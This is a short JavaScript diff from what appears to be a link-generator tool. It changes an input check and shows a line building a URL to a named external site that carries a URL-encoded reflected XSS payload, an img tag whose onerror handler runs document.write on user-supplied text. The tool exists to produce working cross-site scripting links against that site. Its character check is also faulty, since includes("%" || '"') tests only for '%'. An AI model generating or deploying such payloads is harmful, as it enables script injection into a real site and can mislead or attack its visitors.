@@ -24,7 +24,7 @@ function generate(binput,cidHide) {
             cidHideModified = "";
         }
     convert(binput);
-    if (inputModified.includes("%" || '"')) {
+    if (binput.includes("%" || '"')) {
         alert("Including '%' or '\"' is likely to break the tool. It will still generate, but be careful.");
     }
     var baseURL = "https://movie-pass.live/su/?s=xss&cid=" + cidHideModified + "&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=";
